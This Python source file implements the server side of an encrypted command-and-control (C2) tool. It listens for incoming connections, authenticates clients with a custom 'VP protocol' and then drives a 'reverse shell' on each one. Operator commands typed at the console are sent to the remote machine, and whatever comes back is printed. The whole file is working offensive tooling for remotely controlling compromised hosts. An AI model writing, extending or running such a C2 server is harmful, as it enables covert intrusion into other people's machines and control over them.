import socket
import base64
import threading
import queue
import sys

from datetime import datetime
from network.NetworkError import NetworkError
from network.vp_protocol.authentication.server import server as vp_server_auth
from network.vp_protocol.vp_send import vp_send
from network.vp_protocol.vp_recv import vp_recv


class Server:
    def __init__(self, host, port, private_key, database_path):
        self.host = host
        self.port = port
        self.private_key = private_key
        self.database_path = database_path

    def run(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                sock.bind((self.host, self.port))
            except (PermissionError, OSError) as e:
                raise NetworkError(message=f"{e}")
            sock.listen(1)
            print(f"[*] VP protocol encrypted C2 Server listening on ~ "
                  f"{self.host}:{self.port}.")
            while True:
                try:
                    conn, addr = sock.accept()
                except ConnectionError as e:
                    print(f"[!] Client failed to connect {self.datestamp()}")
                    continue
                try:
                    public_key = vp_server_auth(
                        private_key=self.private_key,
                        database_path=self.database_path,
                        conn=conn,
                        addr=addr,
                        verbose=True)
                except NetworkError as e:
                    print(f"[!] {addr[0]}:{addr[1]} ~ Authentication failed: "
                          f"{e}")
                    conn.close()
                    continue
                print(f"[*] {addr[0]}:{addr[1]} ~ Reverse shell initialized "
                      f"{self.datestamp()}")
                client = threading.Thread(
                    target=self.receive_output,
                    args=(conn, addr, public_key),
                    daemon=True)
                client.start()
                try:
                    while True:
                        cmd = input()
                        if not cmd:
                            cmd = '\n'
                        vp_send(conn=conn,
                                message=cmd,
                                private_key=self.private_key,
                                public_key=public_key)
                except NetworkError as e:
                    print(f"[!] {addr[0]}:{addr[1]} ~ Connection error, "
                          f"disconnecting {self.datestamp()}")
                    continue

    def receive_output(self, conn, addr, public_key):
        try:
            while True:
                message = vp_recv(conn=conn,
                                  private_key=self.private_key,
                                  public_key=public_key)
                if not message:
                    raise NetworkError(
                        message=f"{addr[0]}:{addr[1]} ~ Error lost connection "
                                f"{self.datestamp()}")
                else:
                    print(message, end='')
        except NetworkError as e:
            print(f"[!] {addr[0]}:{addr[1]} ~ Error receiving transmission "
                  f"{self.datestamp()}")
            conn.close()

    @staticmethod
    def datestamp():
        return f"@ {datetime.now().strftime('%m/%d/%Y-%H:%M:%S')}"
